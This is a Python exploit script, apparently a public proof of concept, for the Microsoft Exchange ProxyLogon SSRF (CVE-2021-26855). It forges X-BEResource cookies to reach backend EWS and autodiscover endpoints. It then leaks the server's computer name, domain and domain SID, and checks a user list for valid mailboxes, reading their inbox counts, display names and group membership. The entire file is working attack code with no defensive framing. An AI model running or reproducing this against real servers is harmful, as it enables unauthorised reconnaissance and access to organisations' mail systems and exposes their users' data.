'''
Author: Udyz
Referral:
- https://gist.github.com/testanull/324546bffab2fe4916d0f9d1f03ffa09
- https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse
- https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-26855.yaml
- https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/
- https://proxylogon.com
[*] CVE-2021-26855 SSRF Exchange Server
'''
# -*- coding: utf-8 -*-
import requests
import sys
import re
import time
from multiprocessing.dummy import Pool as ThreadPool
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import tldextract
#i don't know how to use regex domain without subdomain, so im gonna use this modules...
def exploit(url):
	try:
		print('[*] Target: %s'%url)
		server = url + '/owa/auth.owa'
		s = requests.Session()
		req = s.post(server, verify=False,timeout=15)
		if not req.status_code == 400:
			print('[-] Target is not Vuln!')
			exit(0)
		server_name = req.headers["X-FEServer"]
		print('(*) Getting FQDN Name: %s'%(server_name))
		path_maybe_vuln = ['/ecp/pentest.js', '/ecp/default.flt', '/ecp/main.css']
		headers = {
		'User-Agent': 'Hello-World',
		'Cookie': 'X-BEResource={FQDN}/EWS/Exchange.asmx?a=~1942062522;'.format(FQDN=server_name),
		'Connection': 'close',
		'Content-Type': 'text/xml',
		'Accept-Encoding': 'gzip'
		}
		payload = """<?xml version="1.0" encoding="utf-8"?>
					<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
					xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
					xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
					xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
					    <soap:Body>
					        <m:GetFolder>
					            <m:FolderShape>
					                <t:BaseShape>Default</t:BaseShape>
					            </m:FolderShape>
					            <m:FolderIds>
					                <t:DistinguishedFolderId Id="inbox">
					                    <t:Mailbox>
					                        <t:EmailAddress>admin@domain.tld</t:EmailAddress>
					                    </t:Mailbox>
					                </t:DistinguishedFolderId>
					            </m:FolderIds>
					        </m:GetFolder>
					    </soap:Body>
					</soap:Envelope>
		"""
		for x in path_maybe_vuln:
			reqs = s.post('%s/%s' %(url,x),headers=headers,data=payload, verify=False,timeout=15)
			if reqs.status_code == 200:
				#print(reqs.text)
				path_is_vuln = x
				print('(+) Path %s is vuln to CVE-2021-26855!'%x)
				#print(reqs.headers)
				print('(*) Getting Information Server')
				print('(+) Computer Name = %s'%reqs.headers["X-DiagInfo"])
				print('(+) Domain Name = %s'%reqs.headers["X-CalculatedBETarget"].split(',')[1])
				print('(+) Domain SID = %s'%reqs.headers["Set-Cookie"].split('X-BackEndCookie=')[1].split(';')[0])
				print('(*) Find valid mail from users list')
				u_m = reqs.headers["X-CalculatedBETarget"].split(',')[1]
				f = open('users.txt').read().splitlines()
				for u in f:
					domainstr = tldextract.extract(u_m)
					domain = "{}.{}".format(domainstr.domain, domainstr.suffix)
					user = u
					if ('local' in u_m):
						domain = '%s.local'%reqs.headers["X-CalculatedBETarget"].split(',')[1].split('.')[1]
						#print(domain)
						#sometime extract domain tld is wrong
					mail = '{user}@{domain}'.format(user=user, domain=domain)
					mailnum = '''<?xml version="1.0" encoding="utf-8"?>
						<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
						xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
						xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
						xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
						    <soap:Body>
						        <m:GetFolder>
						            <m:FolderShape>
						                <t:BaseShape>Default</t:BaseShape>
						            </m:FolderShape>
						            <m:FolderIds>
						                <t:DistinguishedFolderId Id="inbox">
						                    <t:Mailbox>
						                        <t:EmailAddress>{mail}</t:EmailAddress>
						                    </t:Mailbox>
						                </t:DistinguishedFolderId>
						            </m:FolderIds>
						        </m:GetFolder>
						    </soap:Body>
						</soap:Envelope>
					'''.format(mail=mail)
					mail_valid = ''
					reqx = s.post('%s/%s' %(url,x),headers=headers,data=mailnum, verify=False)
					if '<m:ResponseCode>NoError</m:ResponseCode>' in reqx.text:
						xmlstr = """{data}""".format(data=reqx.text)
						total_count = re.findall('(?:<t:TotalCount>)(.+?)(?:</t:TotalCount>)', xmlstr)
						print('-'*35)
						print('(+) %s | Total Inbox = %s'%(mail,total_count[0]))
						mail_valid = mail
					elif 'Access is denied. Check credentials and try again' in reqx.text:
						print('(!) %s | Access is denied, try again!'%(mail))
					else:
						print('(-) %s | Invalid mail'%(mail))
					headers_for_audio = {
					"User-Agent": "Hello-World",
					"Cookie": "X-BEResource={FQDN}/autodiscover/autodiscover.xml?a=~1942062522;".format(FQDN=server_name),
					"Connection": "close",
					"Content-Type": "text/xml"
					}
					autodiscover_payload = '''
					<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
				    <Request>
				      <EMailAddress>{mail}</EMailAddress>
				      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
				    </Request>
				</Autodiscover>
					'''.format(mail=mail_valid)
					r3q = s.post('%s/%s'%(url,path_is_vuln), headers=headers_for_audio, data=autodiscover_payload, verify=False)
					if 'DisplayName' in r3q.text:
						txtstr = """%s"""%(r3q.text)
						display_name = re.findall('(?:<DisplayName>)(.+?)(?:</DisplayName>)', txtstr)
						localgroup = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', txtstr)
						groupname = re.findall('(?:<GroupingInformation>)(.+?)(?:</GroupingInformation>)', txtstr)
						#rpc_add = re.findall('(?:<PublicFolderServer>)(.+?)(?:</PublicFolderServer>)', txtstr)
						#dc_add = re.findall('(?:<AD>)(.+?)(?:</AD>)', txtstr)
						#print('(*) Leaked Information Server')
						print('(+) Display Name = %s' %display_name[0])
						print('(+) Group Name = %s'%groupname[0])
						print('(+) Group Member = %s'%localgroup[0].split('/ou=')[1].split('/cn=')[0])
						print('-'*35)		
						#print('(+) RPC Address = %s'%rpc_add[0])
						#print('(+) DC Address = %s'%dc_add[0])
						#with open('data-{host}-{user}.yml'.format(host=url.replace('https://','/').replace('http://','').replace('/', ''),user=user), 'a+') as f:
							#data_encode = r3q.text.encode('utf-8', errors='ignore')
							#f.write(data_encode.decode('utf-8'), errors='ignore')
							
				exit(0)
			else:
				print('(-) Path %s is not vuln to CVE-2021-26855!'%x)
	except Exception as e:
		print(e)
		pass
	except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout) as e:
		print(e)
		pass
if(len(sys.argv) < 2):
	print('[*] CVE-2021-26855 SSRF Exchange Server\n./%s <https://url>\n--------------------\n+ Author: github.com/Udyz\n+ twitter.com/lotusdll\n--------------------\n'%(sys.argv[0]))
	exit(0)
exploit(sys.argv[1])
